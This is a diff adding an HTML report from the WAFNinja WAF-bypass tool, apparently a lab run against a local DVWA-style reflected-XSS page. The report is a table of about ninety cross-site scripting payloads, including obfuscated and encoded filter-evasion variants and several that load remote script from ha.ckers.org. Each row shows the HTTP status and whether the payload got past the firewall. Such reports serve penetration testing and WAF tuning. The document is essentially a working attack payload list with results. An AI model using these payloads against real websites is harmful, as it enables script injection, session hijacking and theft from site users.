@@ -1,0 +1,766 @@
+<meta charset="utf-8"/><style>
+        .OutputTable {
+	margin:0px;padding:0px;
+	width:100%;
+	border:1px solid #000000;
+	
+	-moz-border-radius-bottomleft:10px;
+	-webkit-border-bottom-left-radius:10px;
+	border-bottom-left-radius:10px;
+	
+	-moz-border-radius-bottomright:10px;
+	-webkit-border-bottom-right-radius:10px;
+	border-bottom-right-radius:10px;
+	
+	-moz-border-radius-topright:10px;
+	-webkit-border-top-right-radius:10px;
+	border-top-right-radius:10px;
+	
+	-moz-border-radius-topleft:10px;
+	-webkit-border-top-left-radius:10px;
+	border-top-left-radius:10px;
+	table-layout: fixed;
+        }.OutputTable table{
+            border-collapse: collapse;
+                border-spacing: 0;
+                width:310px;
+                height:100%;
+                margin:0px;padding:0px;
+        }.OutputTable tr:last-child td:last-child {
+                -moz-border-radius-bottomright:10px;
+                -webkit-border-bottom-right-radius:10px;
+                border-bottom-right-radius:10px;
+        }
+        .OutputTable table tr:first-child td:first-child {
+                -moz-border-radius-topleft:10px;
+                -webkit-border-top-left-radius:10px;
+                border-top-left-radius:10px;
+        }
+        .OutputTable table tr:first-child td:last-child {
+                -moz-border-radius-topright:10px;
+                -webkit-border-top-right-radius:10px;
+                border-top-right-radius:10px;
+        }.OutputTable tr:last-child td:first-child{
+                -moz-border-radius-bottomleft:10px;
+                -webkit-border-bottom-left-radius:10px;
+                border-bottom-left-radius:10px;
+        }.OutputTable tr:hover td{
+                background-color:#ffffff;
+        }
+        .OutputTable td{
+                vertical-align:middle;
+                background-color:#ffffff;
+                width:500px; 
+                word-wrap: break-word;
+            height: 15px;
+                border:1px solid #000000;
+                border-width:0px 1px 1px 0px;
+                text-align:center;
+                padding:9px;
+                font-size:15px;
+                font-family:Helvetica;
+                font-weight:normal;
+                color:#000000;
+        }.OutputTable tr:last-child td{
+                border-width:0px 1px 0px 0px;
+        }.OutputTable tr td:last-child{
+                border-width:0px 0px 1px 0px;
+        }.OutputTable tr:last-child td:last-child{
+                border-width:0px 0px 0px 0px;
+        }
+        .OutputTable tr:first-child th{
+                        background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+                border:0px solid #000000;
+                text-align:center;
+                border-width:0px 0px 1px 1px;
+                font-size:15px;
+                font-family:Courier;
+                font-weight:bold;
+                color:#ffffff;
+        }
+        .OutputTable tr:first-child:hover td{
+                background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+        }
+        .OutputTable tr:first-child td:first-child{
+                border-width:0px 0px 1px 0px;
+        }
+        .OutputTable tr:first-child td:last-child{
+                border-width:0px 0px 1px 1px;
+        }
+        .OutputTable td.Yes{
+                background-color:#00FF00;
+        }
+        .OutputTable td.No{
+                background-color:#FF0000;
+        }
+        .OutputTable td.Probably{
+                background-color:#00CCFF;
+        }
+            </style><h1>WAFNinja - Penetration testers favorite for WAF Bypassing</h1><b>URL</b>: http://169.254.179.84/vulnerabilities/xss_r/?name=PAYLOAD<br><b>TYPE: </b>xss<br><b>DELAY: </b>0<br><b>PROXY: </b><br><b>PREFIX: </b><br><b>POSTFIX: </b><br><br><table class="OutputTable">
+    <tr>
+        <th>Payload</th>
+        <th>HTTP Status</th>
+        <th>Content-Length</th>
+        <th>Output</th>
+        <th>Working</th>
+    </tr>
+    <tr>
+        <td>&lt;script&gt;alert(1)&lt;/script&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;scRipt&gt;alErt(1)&lt;/scrIpt&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;img src=x onerror=alert(1)&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;script type=vbscript&gt;MsgBox(0)&lt;/script&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=javascript:alert("XSS")&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=JaVaScRiPt:alert("XSS")&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;BODY ONLOAD=alert("XSS")&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41&gt;</td>
+        <td>400</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="   javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;BODY BACKGROUND="javascript:alert("XSS")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG DYNSRC="javascript:alert("XSS")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;INPUT TYPE="image" DYNSRC="javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;BGSOUND SRC="javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;br size="&amp;{alert("XSS")}"&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;LAYER SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;LINK REL="stylesheet" HREF="javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="vbscript:msgbox("XSS")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="mocha:[code]"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="livescript:[code]"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IFRAME SRC=javascript:alert("XSS")&gt;&lt;/IFRAME&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;FRAMESET&gt;&lt;FRAME SRC=javascript:alert("XSS")&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;TABLE BACKGROUND="javascript:alert("XSS")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;DIV STYLE="background-image: url(javascript:alert("XSS"))"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;DIV STYLE="behaviour: url("http://xss.ha.ckers.org/exploit.htc");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;DIV STYLE="width: expression(alert("XSS"));"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;STYLE&gt;@im\port"\ja\vasc\ript:alert("XSS")";&lt;/STYLE&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG STYLE="xss: expre\ssion(alert("XSS"))"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;STYLE TYPE="text/javascript"&gt;alert("XSS");&lt;/STYLE&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;XML SRC="javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>"&gt; &lt;BODY ONLOAD="a();"&gt;&lt;SCRIPT&gt;function a(){alert("XSS");}&lt;/SCRIPT&gt;&lt;"</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="javascript:alert("XSS")"</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT a="&gt;" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT ="&gt;" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT a="&gt;" "" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT "a="&gt;"" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&gt;link&lt;/A&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF=ht://www.google.com/&gt;link&lt;/A&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF=http://google.com/&gt;link&lt;/A&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF=http://www.google.com./&gt;link&lt;/A&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF="javascript:document.location="http://www.google.com/""&gt;link&lt;/A&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;BASE HREF="javascript:alert("XSS");//"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=# onmouseover="alert("xxs")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC= onmouseover="alert("xxs")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG onmouseover="alert("xxs")"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;</td>
+        <td>400</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</td>
+        <td>400</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</td>
+        <td>400</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</td>
+        <td>400</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="jav&amp;#x09;ascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="jav&amp;#x0A;ascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="jav&amp;#x0D;ascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC=" &amp;#14;  javascript:alert("XSS");"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;IMG SRC="javascript:alert("XSS")"</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>\";alert("XSS");//</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;/script&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;marquee/onstart=confirm(2)&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;table background="javascript:alert(1)"&gt;&lt;/table&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>"/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;svg/onload=prompt(1);&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;isindex action="javas&amp;tab;cript:alert(1)" type=image&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;marquee/onstart=confirm(2)&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;details ontoggle=alert(1)&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;body style="height:1000px" onwheel="[DATA]"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[DATA]"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;body style="height:1000px" onwheel="alert(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;</td>
+        <td>200</td>
+        <td>1523</td>
+        <td></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>?&lt;input type="search" onsearch="aler\u0074(1)"&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>&lt;details ontoggle=alert(1)&gt;</td>
+        <td>403</td>
+        <td>-</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+</table>
